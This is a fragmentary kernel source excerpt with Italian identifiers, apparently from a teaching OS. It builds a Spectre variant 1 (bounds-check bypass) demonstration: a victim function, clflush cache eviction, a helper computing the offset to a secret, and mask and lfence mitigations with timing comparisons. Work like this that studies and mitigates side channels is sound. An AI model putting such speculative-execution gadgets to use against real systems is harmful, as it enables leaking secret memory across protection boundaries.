...
//#define MITIGAZIONE_FENCE
//#define MITIGAZIONE_MASK

#define SEPARAZIONE 2048
#define ARRAY1_SIZE 16

uint8_t array2[256 * SEPARAZIONE];
unsigned int array1_size = ARRAY1_SIZE;
...
extern "C" void c_get_malicious_x ()
{
	esecuzione->contesto[I_RAX] = (natq)(secret - (char * ) array1);
}

extern "C" void c_flush_util (bool type)
{
	if (type) {
	    // Flush array1_size dalla cache
		__builtin_ia32_clflush(&array1_size);
	} else {
		// Flush array2[SEPARAZIONE*(0..255)] dalla cache
		for (int i = 0; i < 256; i++)
			__builtin_ia32_clflush(&array2[i * SEPARAZIONE]);
	}
}

extern "C" natq array_index_mask_nospec(natq, natq);

natq test_vuln(unsigned int x) {
	c_flush_util(0);	
	c_flush_util(1);
	...
	__builtin_ia32_mfence();
	if (x < array1_size) {
	    temp ^= array2[array1[x] * SEPARAZIONE];
	}
	__builtin_ia32_mfence();
...
natq test_fence(unsigned int x) {
	c_flush_util(0);	
	c_flush_util(1);
...
extern "C" void c_test_performance (int x)
{
	int vuln = 0, mask = 0, fence = 0;
	for (int i = 0; i < 1024; i++) {
		vuln += test_vuln(i % 16);
		mask += test_mask(i % 16);
		fence += test_fence(i % 16);
	}
	vuln /= 1024;
	mask /= 1024;
	fence /= 1024;
	
	flog(LOG_INFO, "vuln %d, mask %d, fence %d", vuln, mask, fence);
}



extern "C" void c_victim_function (size_t x)
{
	natq mask;
#ifdef MITIGAZIONE_MASK
	mask = array_index_mask_nospec(x, ARRAY1_SIZE);
	//flog(LOG_INFO, "mask: %d", mask);
#else
	mask = 0xffffffffffffffff;
#endif
	if (x < array1_size) {
		x &= mask;
#ifdef MITIGAZIONE_FENCE
		__builtin_ia32_lfence();
#endif
		temp ^= array2[array1[x] * SEPARAZIONE];
	}
...
extern "C" void c_array_access_function (int i)
{
    if (i < 256) {
	    temp ^= array2[i * SEPARAZIONE];
    }
}
...
err_del_sstack:
	distruggi_pila(p->cr3, fin_sis_p, DIM_SYS_STACK);
err_rel_tab:
	clear_root_tab(p->cr3);
	rilascia_tab(p->cr3);
err_rel_id:
